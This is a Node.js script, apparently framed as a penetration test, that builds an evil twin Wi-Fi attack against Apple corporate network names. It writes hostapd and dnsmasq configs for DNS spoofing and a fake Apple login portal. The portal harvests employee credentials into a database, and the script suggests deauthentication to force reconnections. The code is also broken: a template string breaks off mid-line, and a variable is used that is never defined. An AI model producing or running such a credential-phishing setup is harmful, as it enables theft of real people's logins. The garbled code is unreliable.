#!/usr/bin/env node
/**
 * WiFi Penetration Testing Script for Apple Campus Simulation
 * Evil Twin Attack Framework
 */

const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// Apple corporate WiFi SSID patterns
const APPLE_SSIDS = [
  'Apple Corporate',
  'Apple-Guest',
  'Apple-Internal',
  'Apple-WiFi',
  'Apple-Employee',
  'Apple-Visitor',
  'AAPL-Corp',
  'AAPL-Guest',
  'iCloud-Corp',
  'ApplePark-WiFi',
  'InfiniteLoop-WiFi'
];

// Evil twin configuration
const EVIL_TWIN_CONFIG = {
  interface: 'en0', // Default WiFi interface on macOS
  channel: 6,
  encryption: 'WPA2',
  hidden: false,
  captive_portal: true,
  portal_template: 'apple_corp_portal'
};

// Generate evil twin setup script
function generateEvilTwinScript(ssid, outputFile = 'evil_twin_setup.sh') {
  const interface = EVIL_TWIN_CONFIG.interface;
  const channel = EVIL_TWIN_CONFIG.channel;
  const hidden = EVIL_TWIN_CONFIG.hidden ? 1 : 0;
  const evilSsid = `${ssid}-Secure`;
  
  // Build script with proper escaping
  const scriptLines = [
    '#!/bin/bash',
    `# Evil Twin Attack Setup for Apple WiFi: ${ssid}`,
    '# Generated: $(date)',
    '',
    'set -e',
    '',
    `INTERFACE="${interface}"`,
    `EVIL_SSID="${evilSsid}"`,
    `CHANNEL=${channel}`,
    'CAPTIVE_PORTAL_DIR="./captive_portal"',
    '',
    `echo "[*] Setting up evil twin for Apple network: ${ssid}"`,
    '',
    '# 1. Check WiFi hardware',
    'echo "[1] Checking WiFi hardware..."',
    'if ! networksetup -listallhardwareports | grep -q "${INTERFACE}"; then',
    '  echo "[-] WiFi interface ${INTERFACE} not found"',
    '  exit 1',
    'fi',
    '',
    '# 2. Create hostapd configuration',
    'echo "[2] Creating hostapd configuration..."',
    'cat > hostapd.conf << EOF',
    'interface=${INTERFACE}',
    'driver=nl80211',
    'ssid=${EVIL_SSID}',
    'hw_mode=g',
    'channel=${CHANNEL}',
    'macaddr_acl=0',
    'auth_algs=1',
    `ignore_broadcast_ssid=${hidden}`,
    'wpa=2',
    'wpa_passphrase=AppleSecure2025',
    'wpa_key_mgmt=WPA-PSK',
    'wpa_pairwise=TKIP',
    'rsn_pairwise=CCMP',
    'EOF',
    '',
    '# 3. Create dnsmasq configuration for DHCP/DNS spoofing',
    'echo "[3] Setting up dnsmasq for DHCP/DNS spoofing..."',
    'cat > dnsmasq.conf << EOF',
    'interface=${INTERFACE}',
    'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h',
    'dhcp-option=3,10.0.0.1',
    'dhcp-option=6,10.0.0.1',
    'server=8.8.8.8',
    'log-queries',
    'log-dhcp',
    'address=/#/10.0.0.1',
    'EOF'
  ];
  
  // Add the rest of the script
  const restOfScript = `# 4. Create captive portal
echo "[4] Setting up captive portal..."
mkdir -p "\${CAPTIVE_PORTAL_DIR}"
cat > "\${CAPTIVE_PORTAL_DIR}/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Apple Corporate WiFi Authentication</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f7; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 50px auto; background: white; border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .apple-logo { width: 60px; height: 60px; margin: 0 auto 20px; display: block; }
        h1 { color: #1d1d1f; text-align: center; font-weight: 600; }
        .form-group { margin: 20px 0; }
        label { display: block; margin-bottom: 8px; color: #1d1d1f; font-weight: 500; }
        input { width: 100%; padding: 12px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; box-sizing: border-box; }
        button { background: #007aff; color: white; border: none; padding: 14px 30px; border-radius: 20px; font-size: 16px; width: 100%; cursor: pointer; font-weight: 500; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 14px; }
        .footer { margin-top: 30px; color: #86868b; font-size: 12px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="apple-logo" viewBox="0 0 24 24">
            <path fill="#1d1d1f" d="M14.94,5.19A4.38,4.38,0,0,0,16,2,4.44,4.44,0,0,0,13,3.52,4.17,4.17,0,0,0,12,6.61,3.69,3.69,0,0,0,14.94,5.19Zm2.52,7.44a4.51,4.51,0,0,1,2.16-3.81,4.66,4.66,0,0,0-3.66-2c-1.56-.16-3,.91-3.83.91s-2-.89-3.3-.87A4.92,4.92,0,0,0,4.69,9.39C2.93,12.45,4.24,17,6,19.47,6.8,20.68,7.8,22.05,9.12,22s1.75-.76,3.28-.76,2,.76,3.3.73,2.22-1.24,3.06-2.45a11,11,0,0,0,1.38-2.85A4.41,4.41,0,0,1,17.46,12.63Z"/>
        </svg>
        <h1>Apple Corporate WiFi</h1>
        <div class="warning">
            <strong>Security Notice:</strong> Please authenticate with your Apple credentials to access the corporate network.
        </div>
        <form id="authForm">
            <div class="form-group">
                <label for="username">Apple ID (Email)</label>
                <input type="email" id="username" name="username" placeholder="first.last@apple.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <label for="employee_id">Employee ID (Optional)</label>
                <input type="text" id="employee_id" name="employee_id" placeholder="A123456">
            </div>
            <button type="submit">Connect to Network</button>
        </form>
        <div class="footer">
            Â© 2025 Apple Inc. All rights reserved.<br>
            This network is monitored for security purposes.
        </div>
    </div>
    <script>
        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            
            // Send credentials to attacker
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...data,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    ssid: '\${EVIL_SSID}'
                })
            }).then(() => {
                alert('Authentication successful! Connecting to network...');
                // Redirect to legitimate Apple site
                setTimeout(() => {
                    window.location.href = 'https://www.apple.com';
                }, 2000);
            }).catch(() => {
                alert('Connection error. Please try again.');
            });
        });
    </script>
</body>
</html>
EOF

# 5. Create simple HTTP server for captive portal
cat > "\${CAPTIVE_PORTAL_DIR}/server.py" << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sqlite3
from datetime import datetime
import sys

# Database setup
conn = sqlite3.connect('captured_credentials.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS credentials
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              username TEXT,
              password TEXT,
              employee_id TEXT,
              timestamp TEXT,
              user_agent TEXT,
              ssid TEXT)''')
conn.commit()

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile
  
  fs.writeFileSync(outputFile, script);
  fs.chmodSync(outputFile, '755');
  
  console.log(`âœ… Evil twin script generated: ${outputFile}`);
  console.log(`ðŸ“¶ Target SSID pattern: ${ssid}`);
  console.log(`ðŸŽ¯ Evil SSID: ${ssid}-Secure`);
  console.log(`ðŸŒ Captive portal: http://10.0.0.1`);
  console.log(`\nâš ï¸  REQUIREMENTS:`);
  console.log(`   - WiFi adapter supporting AP mode`);
  console.log(`   - hostapd installed (brew install hostapd)`);
  console.log(`   - dnsmasq installed (brew install dnsmasq)`);
  console.log(`   - Python 3 for captive portal`);
  console.log(`   - Root privileges (sudo)`);
  
  return outputFile;
}

// Main execution
if (require.main === module) {
  const targetSsid = process.argv[2] || 'Apple Corporate';
  const outputFile = process.argv[3] || 'apple_evil_twin.sh';
  
  console.log('========================================');
  console.log('   APPLE CAMPUS WIFI PENETRATION TEST   ');
  console.log('========================================\n');
  
  console.log('ðŸ“¡ Available Apple SSID patterns:');
  APPLE_SSIDS.forEach((ssid, i) => {
    console.log(`   ${i + 1}. ${ssid}`);
  });
  
  console.log(`\nðŸŽ¯ Selected target: ${targetSsid}`);
  
  generateEvilTwinScript(targetSsid, outputFile);
  
  console.log('\n========================================');
  console.log('NEXT STEPS:');
  console.log('1. Install requirements: brew install hostapd dnsmasq');
  console.log('2. Make script executable: chmod +x apple_evil_twin.sh');
  console.log('3. Run setup: ./apple_evil_twin.sh');
  console.log('4. Start attack: sudo ./start_attack.sh');
  console.log('5. Optional: Run deauth.sh to force reconnections');
  console.log('========================================');
}

module.exports = { generateEvilTwinScript, APPLE_SSIDS, EVIL_TWIN_CONFIG };